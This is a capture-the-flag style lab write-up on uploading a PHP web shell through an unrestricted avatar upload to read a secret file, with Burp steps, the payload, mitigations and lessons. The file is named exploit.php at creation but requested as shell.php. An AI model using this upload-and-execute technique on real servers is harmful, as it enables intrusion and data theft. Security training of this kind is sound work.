# Lab Name
Remote code execution via web shell upload

## Vulnerability
Unrestricted File Upload – Remote Code Execution (RCE)

## Objective
Exploit the insecure avatar upload functionality to upload a malicious PHP file, execute it on the server, retrieve Carlos's secret, and solve the lab.

## Entry Point
Avatar Upload functionality

## Exploitation Type
Unrestricted File Upload / Remote Code Execution (RCE)

## Methodology
1. Open Burp's browser and log in using the provided user credentials.

2. Navigate to the **My Account** page and locate the avatar upload functionality.

3. Upload any valid image file and return to the account page.

4. Observe that the uploaded avatar is displayed as a preview.

5. In **Burp Suite**, go to **Proxy > HTTP History**.

6. Open the filter options and enable the **Images** MIME type filter.

7. Locate the request that loads the uploaded avatar.

Example:

```http
GET /files/avatars/image.jpg HTTP/1.1
```

8. Send this request to **Burp Repeater**.

9. On your local machine, create a PHP file named **exploit.php** with the following content:

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

10. Return to the application and upload **exploit.php** using the avatar upload functionality.

11. Observe that the server accepts the upload successfully.

12. In **Burp Repeater**, modify the request path to request the uploaded PHP file.

```http
GET /files/avatars/shell.php HTTP/1.1
```

13. Send the request.

14. Observe that the server executes the PHP script instead of serving it as a file.

15. Copy Carlos's secret from the response.

16. Submit the secret to complete the lab.

## Payload Used

### PHP Web Shell

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

### Request

```http
GET /files/avatars/shell.php HTTP/1.1
```

## Result
Successfully uploaded and executed a malicious PHP file on the server, retrieved Carlos's secret, and solved the lab.

## Impact
- Remote Code Execution (RCE)
- Arbitrary file read
- Server compromise
- Sensitive information disclosure
- Potential full system compromise

## Mitigation
- Restrict uploads to trusted file types only.
- Validate file extensions, MIME types, and file signatures on the server.
- Store uploaded files outside the web root.
- Disable execution permissions for uploaded files.
- Rename uploaded files and use randomized filenames.
- Implement strict server-side validation and access controls.

## Learning
Allowing users to upload executable files without proper validation can lead to Remote Code Execution. If uploaded files are stored inside a web-accessible directory and executed by the server, attackers can run arbitrary code, read sensitive files, and potentially gain complete control of the application or underlying system.
